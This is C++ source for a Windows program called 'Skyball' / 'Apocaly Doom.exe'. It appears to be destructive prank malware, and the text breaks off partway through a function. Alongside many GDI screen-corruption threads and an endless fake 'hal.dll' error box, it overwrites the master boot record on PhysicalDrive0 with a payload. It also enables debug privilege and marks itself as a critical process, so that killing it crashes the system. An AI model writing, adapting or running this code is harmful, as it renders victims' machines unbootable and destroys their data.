// Skyball.cpp : Defines the entry point for the application.
//

#include "Skyball.h"
#define _USE_MATH_DEFINES 1
#include <iostream>
#include <stdio.h>
#include <windows.h>
#include <windowsx.h>
#include <math.h>
#include <stdlib.h>
#include <time.h>
#include <conio.h>
#include <windef.h>
#include <fstream>
#include <cstdlib>
#include <memory>
#include <iosfwd>
#include <string>
#include <memory>
#include <stdio.h>
#include <tchar.h>
#include <ctime>
#include <cmath>
#include <thread>
#include <mmsystem.h>
#include <stdint.h>
#include <vector>
#include <tlhelp32.h>
#include "noskidrec.h"
#define PI 3.1415926535897932384626433832795028841971
#define sqrt8 2.8284271247461900976033774484194
#define sqrt2 1.414213562373095048801688724209
#define RndRGB (RGB(rand() % 256, rand() % 256, rand() % 256))
#define ApocalyDoomRGB (RGB(100, 50, 25))
#pragma comment(lib, "Winmm.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "msimg32.lib")
#define DESKTOP_WINDOW ((HWND)0)
using namespace std;
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE b;
		BYTE g;
		BYTE r;
		BYTE Reserved;
	};
}_RGBQUAD, *PRGBQUAD;
typedef struct
{
	FLOAT h;
	FLOAT s;
	FLOAT l;
} HSL;
typedef union ColorTemp {
	COLORREF rgb;
	struct {
		BYTE b;
		BYTE g;
		BYTE r;
		BYTE unused;
	};
} *ColorTemps;
namespace Colors
{
	//These HSL functions was made by Wipet, credits to him!

	HSL rgb2hsl(RGBQUAD rgb)
	{
		HSL hsl;

		BYTE r = rgb.rgbRed;
		BYTE g = rgb.rgbGreen;
		BYTE b = rgb.rgbBlue;

		FLOAT _r = (FLOAT)r / 255.f;
		FLOAT _g = (FLOAT)g / 255.f;
		FLOAT _b = (FLOAT)b / 255.f;

		FLOAT rgbMin = min(min(_r, _g), _b);
		FLOAT rgbMax = max(max(_r, _g), _b);

		FLOAT fDelta = rgbMax - rgbMin;
		FLOAT deltaR;
		FLOAT deltaG;
		FLOAT deltaB;

		FLOAT h = 0.f;
		FLOAT s = 0.f;
		FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);

		if (fDelta != 0.f)
		{
			s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
			deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);

			if (_r == rgbMax)      h = deltaB - deltaG;
			else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
			else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
			if (h < 0.f)           h += 1.f;
			if (h > 1.f)           h -= 1.f;
		}

		hsl.h = h;
		hsl.s = s;
		hsl.l = l;
		return hsl;
	}

	RGBQUAD hsl2rgb(HSL hsl)
	{
		RGBQUAD rgb;

		FLOAT r = hsl.l;
		FLOAT g = hsl.l;
		FLOAT b = hsl.l;

		FLOAT h = hsl.h;
		FLOAT sl = hsl.s;
		FLOAT l = hsl.l;
		FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);

		FLOAT m;
		FLOAT sv;
		FLOAT fract;
		FLOAT vsf;
		FLOAT mid1;
		FLOAT mid2;

		INT sextant;

		if (v > 0.f)
		{
			m = l + l - v;
			sv = (v - m) / v;
			h *= 6.f;
			sextant = (INT)h;
			fract = h - sextant;
			vsf = v * sv * fract;
			mid1 = m + vsf;
			mid2 = v - vsf;

			switch (sextant)
			{
			case 0:
				r = v;
				g = mid1;
				b = m;
				break;
			case 1:
				r = mid2;
				g = v;
				b = m;
				break;
			case 2:
				r = m;
				g = v;
				b = mid1;
				break;
			case 3:
				r = m;
				g = mid2;
				b = v;
				break;
			case 4:
				r = mid1;
				g = m;
				b = v;
				break;
			case 5:
				r = v;
				g = m;
				b = mid2;
				break;
			}
		}

		rgb.rgbRed = (BYTE)(r * 255.f);
		rgb.rgbGreen = (BYTE)(g * 255.f);
		rgb.rgbBlue = (BYTE)(b * 255.f);

		return rgb;
	}
}
void InitDPI() {
	HMODULE hModule = LoadLibraryA("user32.dll");
	BOOL(WINAPI * SetProcessDPIAware)(VOID) = (BOOL(WINAPI*)(VOID))GetProcAddress(hModule, "SetProcessDPIAware");
	if (SetProcessDPIAware) {
		SetProcessDPIAware();
	}
	FreeLibrary(hModule);
}
int refreshscr() {
	HDC hdc = GetDC(0);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
	InvalidateRect(0, 0, 0);
	BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
	return 1;
}
DWORD WINAPI fe(LPVOID lpParam) {
	while (true)
	{
		MessageBox(NULL, L"hal.dll--unknown hard error:\r\n\ 0x00114514 specified the memory at 0x00114514. The requested data could not be placed in memory due to error 0x78917891.\r\n\r\n\To terminate the program, please click 'Yes'.\r\n\To test the program, please click 'No'.", L"Apocaly Doom.exe--Congratulations", MB_ICONERROR | MB_YESNO);
	}
	return 0;
}
VOID WINAPI MsgBoxCorruptionThread(HWND hwndMsgBox) {
	HDC hdc = GetDC(hwndMsgBox);
	RECT rect;
	GetWindowRect(hwndMsgBox, &rect);
	int w = rect.right - rect.left, h = rect.bottom - rect.top;
	double angle = 0; BLENDFUNCTION blur = { AC_SRC_OVER, 0, 5, 0 };
	while (true)
	{
		int w = rect.right - rect.left, h = rect.bottom - rect.top;
		HDC hdc = GetDC(hwndMsgBox), hcdc = CreateCompatibleDC(hdc);
		HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int nindazhidazhidadazhi = 0; nindazhidazhidadazhi < 10; nindazhidazhidadazhi++) {
			HBRUSH hBrush = CreateSolidBrush(ApocalyDoomRGB);
			HPEN pen = CreatePen(PS_NULL, NULL, NULL);
			SelectObject(hcdc, hBrush);
			SelectObject(hcdc, pen);
			Rectangle(hcdc, 0, 0, w, h);
			DeleteObject(hBrush);
			DeleteObject(pen);
			GdiAlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
			Sleep(250);
		}
		Sleep(250);
		ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
		DeleteObject(hBitmap);
		DeleteDC(hcdc); DeleteDC(hdc);
	}
}
LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HCBT_ACTIVATE) {
		HWND hwndMsgBox = (HWND)wParam;
		ShowWindow(hwndMsgBox, 5);
		HANDLE handle = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)MsgBoxCorruptionThread, hwndMsgBox, 0, NULL);
		return 0;
	}
	return CallNextHookEx(0, nCode, wParam, lParam);
}
DWORD xs;
VOID SeedXorshift32(DWORD dwSeed) {
	xs = dwSeed;
}
DWORD Xorshift32() {
	xs ^= xs << 13;
	xs ^= xs << 17;
	xs ^= xs << 5;
	return xs;
}

DWORD WINAPI mbr(LPVOID lpParam) {
	DWORD Bytes;
	HANDLE hFile = CreateFileA(
		"\\\\.\\PhysicalDrive0", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
		OPEN_EXISTING, NULL, NULL);
	WriteFile(hFile, MasterBootRecord, 32768, &Bytes, NULL);
	return 1;
}

void RegAdd(HKEY HKey, LPCWSTR Subkey, LPCWSTR ValueName, unsigned long Type, unsigned int Value) { //credits to Mist0090
	HKEY hKey;
	DWORD dwDisposition;
	LONG result;
	result = RegCreateKeyExW(HKey, Subkey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition);
	result = RegSetValueExW(hKey, ValueName, 0, Type, (const unsigned char*)&Value, (int)sizeof(Value));
	RegCloseKey(hKey);
	return;
}

typedef VOID(_stdcall* RtlSetProcessIsCritical) (
	IN BOOLEAN        NewValue,
	OUT PBOOLEAN OldValue,
	IN BOOLEAN     IsWinlogon);

BOOL EnablePriv(LPCWSTR lpszPriv) //enable Privilege
{
	HANDLE hToken;
	LUID luid;
	TOKEN_PRIVILEGES tkprivs;
	ZeroMemory(&tkprivs, sizeof(tkprivs));

	if (!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken))
		return FALSE;

	if (!LookupPrivilegeValue(NULL, lpszPriv, &luid)) {
		CloseHandle(hToken); return FALSE;
	}

	tkprivs.PrivilegeCount = 1;
	tkprivs.Privileges[0].Luid = luid;
	tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	BOOL bRet = AdjustTokenPrivileges(hToken, FALSE, &tkprivs, sizeof(tkprivs), NULL, NULL);
	CloseHandle(hToken);
	return bRet;
}

BOOL ProcessIsCritical()
{
	HANDLE hDLL;
	RtlSetProcessIsCritical fSetCritical;

	hDLL = LoadLibraryA("ntdll.dll");
	if (hDLL != NULL)
	{
		EnablePriv(SE_DEBUG_NAME);
		(fSetCritical) = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)hDLL, "RtlSetProcessIsCritical");
		if (!fSetCritical) return 0;
		fSetCritical(1, 0, 0);
		return 1;
	}
	else
		return 0;
}

BOOL FilterBltEx(HDC hdc, int x, int y, int width, int height, COLORREF(*Filter)(COLORREF, int, int)) {
	if (!hdc || width <= 0 || height <= 0 || x < 0 || y < 0 || !Filter) {
		return FALSE;
	}
	HDC memDC = CreateCompatibleDC(hdc);
	if (!memDC) return FALSE;
	HBITMAP hMemBmp = CreateCompatibleBitmap(hdc, width, height);
	if (!hMemBmp) {
		DeleteDC(memDC);
		return FALSE;
	}
	HBITMAP hOldBmp = (HBITMAP)SelectObject(memDC, hMemBmp);
	if (!hOldBmp) {
		DeleteObject(hMemBmp);
		DeleteDC(memDC);
		return FALSE;
	}
	if (!BitBlt(memDC, 0, 0, width, height, hdc, x, y, SRCCOPY)) {
		SelectObject(memDC, hOldBmp);
		DeleteObject(hMemBmp);
		DeleteDC(memDC);
		return FALSE;
	}
	BITMAPINFO bmi;
	ZeroMemory(&bmi, sizeof(bmi));
	bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	bmi.bmiHeader.biWidth = width;
	bmi.bmiHeader.biHeight = -height;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biBitCount = 24;
	bmi.bmiHeader.biCompression = BI_RGB;
	const DWORD rowBytes = ((width * 3 + 3) & ~3);
	BYTE* pPixels = (BYTE*)LocalAlloc(LPTR, rowBytes * height);
	if (!pPixels) {
		SelectObject(memDC, hOldBmp);
		DeleteObject(hMemBmp);
		DeleteDC(memDC);
		return FALSE;
	}
	BOOL success = FALSE;
	if (GetDIBits(memDC, hMemBmp, 0, height, pPixels, &bmi, DIB_RGB_COLORS)) {
		BYTE* pRow = pPixels;
		int actualY = y;
		for (int row = 0; row < height; ++row, pRow += rowBytes, actualY++) {
			BYTE* pPixel = pRow;
			int actualX = x;
			for (int col = 0; col < width; ++col, pPixel += 3, actualX++) {
				COLORREF original = RGB(pPixel[2], pPixel[1], pPixel[0]);  // BGR or RGB
				COLORREF filtered = Filter(original, actualX, actualY);
				pPixel[0] = GetBValue(filtered);
				pPixel[1] = GetGValue(filtered);
				pPixel[2] = GetRValue(filtered);
			}
		}
		if (SetDIBits(memDC, hMemBmp, 0, height, pPixels, &bmi, DIB_RGB_COLORS)) {
			success = BitBlt(hdc, x, y, width, height, memDC, 0, 0, SRCCOPY);
		}
	}
	LocalFree(pPixels);
	SelectObject(memDC, hOldBmp);
	DeleteObject(hMemBmp);
	DeleteDC(memDC);
	return success;
}

DWORD WINAPI drawbytebeat1(LPVOID lpParam) {
	while (true)
	{
		HDC hdc = GetWindowDC(0);
		FilterBltEx(hdc, 0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), [](COLORREF c, int x, int y)->COLORREF {
			static int t = 0;
			t++;
			return ((t >> 3 + 2 * t | t << 2 % (t + 1 | t)));
		});
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI noskidball(LPVOID lpParam) {
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	int radius = 110, angle = 0, count = 0;
	int sx = 1, sy = 1, x = 10, y = 10;;
	int incrementor = 1;
	while (true) {
		x += (incrementor * sx);
		y += (incrementor * sy);
		HICON hIcon = LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON2));
		HDC hdc = GetDC(0);
		DrawIcon(hdc, x + (radius * cos(angle * M_PI / 18)), y + (radius * sin(angle * M_PI / 18)), hIcon);
		ReleaseDC(0, hdc);
		DestroyIcon(hIcon);
		DeleteObject(hIcon);
		DeleteDC(hdc);
		if (y >= h) { sy = -1; }
		if (x >= w) { sx = -1; }
		if (y <= 0) { sy = 1; }
		if (x <= 0) { sx = 1; }
		angle++;
		if (count == 10) {
			count = 0;
			Sleep(10);
		}
		else {
			count++;
		}
	}
}

DWORD WINAPI noskid1(LPVOID lpParam) {
	HDC hdc = GetDC(0); HWND wnd = GetDesktopWindow();
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	double angle = 0;
	while (1) {
		hdc = GetDC(0);
		for (float i = 0; i < sw + sh; i += 0.99f) {
			int a = sin(angle) * 200;
			BitBlt(hdc, 0, i, sw, 1, hdc, a, i, SRCINVERT);
			angle += M_PI / 40;
			DeleteObject(&i); DeleteObject(&a);
		}
		ReleaseDC(wnd, hdc);
		DeleteDC(hdc); DeleteObject(&sw); DeleteObject(&sh); DeleteObject(&angle);
	}
}

DWORD WINAPI noskid1d1(LPVOID lpParam) { //NO credits to Sensist2K05
	int time = GetTickCount();
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	for (int i = 0;; i++, i %= 3) {
		HDC desk = GetDC(NULL);
		HDC hdcdc = CreateCompatibleDC(desk);
		HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcdc, hbm);
		BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
		GetBitmapBits(hbm, w * h * 4, data);
		int v = 0;
		BYTE byte = 0;
		if ((GetTickCount() - time) > 60000)
			byte = rand() % 0xff;
		for (int i = 0; w * h > i; i++) {
			if (i % h == 0 && rand() % 100 == 0)
				v = rand() % 2;
			*((BYTE*)data + 4 * i + 9) = ((BYTE*)(data + i + 11))[9];
		}
		SetBitmapBits(hbm, w * h * 4, data);
		BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
		ReleaseDC(0, desk);
		DeleteObject(hbm);
		DeleteObject(hdcdc);
		DeleteObject(desk);
	}
	return 0;
}

DWORD WINAPI noskid2(LPVOID lpParam) { //by the no skid
	HDC hdc = GetDC(0);
	HWND wnd = GetDesktopWindow();

	int sw = GetSystemMetrics(0);
	int sh = GetSystemMetrics(1);

	BITMAPINFO bmi = { 40, sw, sh, 1, 24 };
	PRGBTRIPLE rgbtriple;

	for (;;) {
		hdc = GetDC(0);
		HDC hdcCopy = CreateCompatibleDC(hdc);
		HBITMAP scr = CreateDIBSection(hdc, &bmi, 0, (void**)&rgbtriple, 0, 0);
		SelectObject(hdcCopy, scr);
		BitBlt(hdcCopy, 0, 0, sw, sh, hdc, 0, 0, SRCCOPY);
		for (int i = 0; i < sw * sh; i++) {
			int x = i % sw, y = i / sh, t = y ^ y | x;
			rgbtriple[i].rgbtRed *= GetRValue((x * y) * (i / 100)) / 10;
			rgbtriple[i].rgbtGreen += GetGValue((x * y) * (i / 100)) / 11;
			rgbtriple[i].rgbtBlue -= GetBValue((x * y) * (i / 100)) / 12;
		}
		BitBlt(hdc, 0, 0, sw, sh, hdcCopy, 0, 0, SRCCOPY);
		ReleaseDC(wnd, hdc);

		DeleteDC(hdc);
		DeleteDC(hdcCopy);

		DeleteObject(scr);
		DeleteObject(wnd);
		DeleteObject(rgbtriple);

		DeleteObject(&sw);
		DeleteObject(&sh);
		DeleteObject(&bmi);
	}
}

DWORD WINAPI noskid3(LPVOID lpParam) { //by the no skid
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	int pertcangfiy = 0;
	for (;;) {
		hdcScreen = GetDC(0);
		pertcangfiy = 5 + pertcangfiy;
		StretchBlt(hdcMem, pertcangfiy, 0, w, h, hdcScreen, 0, 0, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			int randPixel = rand() % w;
			int tempR = GetRValue(rgbScreen[i].rgb), tempG = GetGValue(rgbScreen[i].rgb), tempB = GetBValue(rgbScreen[i].rgb);
			int color = RGB(tempB, tempG, tempR);
			INT x = i % w, y = i / w;
			int Xii = x & x;
			int Yii = y & y;
			rgbScreen[i].r = color - color;
			rgbScreen[i].g = Xii & Yii;
			rgbScreen[i].b = x ^ y;
			rgbScreen[randPixel].rgb = RGB(tempR, tempG, tempB);
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, pertcangfiy, 0, SRCCOPY);
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, pertcangfiy - w + 160, 0, SRCCOPY);
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, pertcangfiy - w - w + 160, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}

DWORD WINAPI noskid4(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].r ^= x & y | x * y | x ^ y | x + y | x - y;
			rgbScreen[i].g ^= x & y | x * y | x ^ y | x + y | x - y;
			rgbScreen[i].b ^= x & y | x * y | x ^ y | x + y | x - y;
			rgbScreen[i].r *= 5;
			rgbScreen[i].b *= 10;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}

DWORD WINAPI noskid5(LPVOID lpParam) {
	int i = 0, xxx = 0;
	while (true) {
		HDC hdc = GetDC(0);
		HDC hcdc = CreateCompatibleDC(hdc);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		BITMAPINFO bmpi = { 0 };
		bmpi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
		RGBQUAD* rgbquad = NULL;
		HSL hslcolor;
		RGBQUAD rgbquadCopy;
		HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
		SelectObject(hcdc, hBitmap);
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = w * y + x;
				int fx = (int)(((x * xxx) & (y * xxx) & (x - xxx) ^ y));
				rgbquad[index].rgbRed ^= fx + i;
				rgbquad[index].rgbGreen ^= fx + i;
				rgbquad[index].rgbBlue ^= fx + i;
			}
		}
		BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCINVERT);
		ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
		DeleteObject(hBitmap);
		DeleteDC(hdc); DeleteDC(hcdc);
		i++, xxx += 2;
	}
}

DWORD WINAPI noskidheadshot(LPVOID lpParam)
{
	while (1) {
		HDC hdc = GetDC(0);
		int x = GetSystemMetrics(SM_CXSCREEN);
		int y = GetSystemMetrics(SM_CYSCREEN);
		//int rrr = (rand () % 5 + 1)
		DrawIconEx(hdc, rand() % x, rand() % y, LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON2)), (rand() % 5 + 1) * GetSystemMetrics(SM_CXICON), (rand() % 5 + 1) * GetSystemMetrics(SM_CYICON), 0, NULL, DI_NORMAL);
		DrawIconEx(hdc, rand() % x, rand() % y, LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON2)), (rand() % 5 + 1) * GetSystemMetrics(SM_CXICON), (rand() % 5 + 1) * GetSystemMetrics(SM_CYICON), 0, NULL, DI_NORMAL);
		DrawIconEx(hdc, rand() % x, rand() % y, LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON2)), (rand() % 5 + 1) * GetSystemMetrics(SM_CXICON), (rand() % 5 + 1) * GetSystemMetrics(SM_CYICON), 0, NULL, DI_NORMAL);
		DrawIconEx(hdc, rand() % x, rand() % y, LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON2)), (rand() % 5 + 1) * GetSystemMetrics(SM_CXICON), (rand() % 5 + 1) * GetSystemMetrics(SM_CYICON), 0, NULL, DI_NORMAL);
		DrawIconEx(hdc, rand() % x, rand() % y, LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON2)), (rand() % 5 + 1) * GetSystemMetrics(SM_CXICON), (rand() % 5 + 1) * GetSystemMetrics(SM_CYICON), 0, NULL, DI_NORMAL);
		ReleaseDC(0, hdc);
		Sleep(1);
	}
}

DWORD WINAPI noskid6(LPVOID lpParam) {
	int xxx = 0;
	bool jntm = false;
	HDC hcdc2 = 0;
	HBITMAP hBitmap2 = 0;
	while (true) {
		jntm = false;
		if (rand() % 20 > 15) { jntm = true; }
		int randrgb = RGB(rand() % 1000, rand() % 1000, rand() % 1000);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		HDC hdc = GetDC(0);
		HDC hcdc = CreateCompatibleDC(hdc);
		if (jntm == true) { hcdc2 = CreateCompatibleDC(hdc); }
		BITMAPINFO bmi = { 0 };
		PRGBQUAD rgbScreen = { 0 };
		bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
		HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
		if (jntm == true) { hBitmap2 = CreateCompatibleBitmap(hdc, w, h); }
		SelectObject(hcdc, hBitmap);
		if (jntm == true) { SelectObject(hcdc2, hBitmap2); }
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		if (jntm == true) { BitBlt(hcdc2, 0, 0, w, h, hcdc, 0, 0, SRCCOPY); }
		if (jntm == true) {
			StretchBlt(hcdc, 0, 0, w / 2, h / 2, hcdc2, 0, 0, w, h, SRCCOPY);
			StretchBlt(hcdc, w / 2, 0, w / 2, h / 2, hcdc2, 0, 0, w, h, SRCCOPY);
			StretchBlt(hcdc, 0, h / 2, w / 2, h / 2, hcdc2, 0, 0, w, h, SRCCOPY);
			StretchBlt(hcdc, w / 2, h / 2, w / 2, h / 2, hcdc2, 0, 0, w, h, SRCCOPY);
			for (int bl = 0; bl < h; bl += 2) {
				StretchBlt(hcdc, -2 + rand() % 5, bl, w, 2, hcdc, 0, bl, w, 2, NOTSRCCOPY);
			}
		}
		for (int x = 0; x < w; x += 40) {
			for (int y = 0; y < h; y += 40) {
				StretchBlt(hcdc, x, y, 40, 40, hcdc, x, y, 20, 20, NOTSRCCOPY);
			}
		}
		for (int i = 0; i < w * h; i++) {
			int jntm = i % w ^ i / w;
			rgbScreen[i].rgb += randrgb - ((jntm * xxx) % 114);
		}
		BLENDFUNCTION blf = BLENDFUNCTION{ AC_SRC_OVER, 1, 80, 0 };
		AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blf);
		ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
		if (jntm == true) { ReleaseDC(0, hcdc2); }
		DeleteObject(hBitmap);
		if (jntm == true) { DeleteObject(hBitmap2); }
		DeleteDC(hcdc);
		if (jntm == true) { DeleteDC(hcdc2); }
		DeleteDC(hdc);
	}
}

DWORD WINAPI noskid7(LPVOID lpParam)
{
	HDC hdc = GetDC(HWND_DESKTOP);
	int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);

	while (true)
	{
		HDC hdc = GetDC(HWND_DESKTOP);
		int y = rand() % sh, h = sh - rand() % sh - (sh / 1 - 9);
		HBRUSH brush = CreateSolidBrush(RGB(rand() % 1000, rand() % 1000, rand() % 1000));
		SelectObject(hdc, brush);
		BitBlt(hdc, 0, y, sw, h, hdc, rand() % 106 - 56, y, NOTSRCCOPY);
		PatBlt(hdc, -1, y, sw, h, PATINVERT);
		Sleep(10);
	}
}

DWORD WINAPI noskid8(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].rgb -= 666;
			rgbScreen[i].r += 5;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 10, SRCCOPY);
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, -h + 10, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}

VOID WINAPI ci(int x, int y, int w, int h)
{
	HDC hdc = GetDC(0);
	HRGN hrgn = CreateRoundRectRgn(x, y, w + x, h + y, 10, 10);
	SelectClipRgn(hdc, hrgn);
	HBRUSH brush = CreateSolidBrush(RGB(rand() % 1000, rand() % 1000, rand() % 1000));
	SelectObject(hdc, brush);
	BitBlt(hdc, x, y, w, h, hdc, x, y, PATINVERT);
	DeleteObject(hrgn);
	DeleteObject(brush);
	ReleaseDC(NULL, hdc);
}

DWORD WINAPI noskid81(LPVOID lpParam) {
	RECT rect;
	GetWindowRect(GetDesktopWindow(), &rect);
	int w = rect.right - rect.left, h = rect.bottom - rect.top;

	for (int t = 0;; t++)
	{
		const int size = rand() % 300;
		int x = rand() % (w + size) - size / 2, y = rand() % (h + size) - size / 2;

		for (int i = 0; i < size; i += 10)
		{
			ci(x - i / 2, y - i / 2, i, i);
			Sleep(1);
		}
	}
}

DWORD WINAPI noskid9(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	HDC hdcCopy = CreateCompatibleDC(hdc);

	BITMAPINFO bmpi = { 0 };

	int sw = GetSystemMetrics(0);
	int sh = GetSystemMetrics(1);

	float radius = 0.f;
	double angle = 0;

	while (1) {
		HDC hdc = GetDC(0);

		float x = (cos(angle)) * radius;
		float y = (tan(angle)) * radius;

		HBRUSH brush = CreateSolidBrush(RGB(rand() % 1000, rand() % 1000, rand() % 1000));
		SelectObject(hdc, brush);

		BitBlt(hdc, 0, 0, sw, sh, hdc, x, y, PATINVERT);
		StretchBlt(hdc, x, y, sw - x * 2, sh - y * 2, hdc, 0, 0, sw, sh, NOTSRCCOPY);
		radius += 0.1f;

		DeleteObject(brush);
		ReleaseDC(0, hdc);

		angle = fmod(angle + M_PI / radius, M_PI * radius) / 1.001;
	}
}

DWORD WINAPI noskid91(LPVOID lpParam)
{
	HDC hdc;
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1), xSize = sw / 4, ySize = 8;
	while (1) {
		hdc = GetDC(0); HDC hdcMem = CreateCompatibleDC(hdc);
		HBITMAP screenshot = CreateCompatibleBitmap(hdc, sw, sh);
		SelectObject(hdcMem, screenshot);
		BitBlt(hdcMem, 0, 0, sw, sh, hdc, 0, 0, SRCINVERT);
		for (int i = 0; i < sw + 10; i++) {
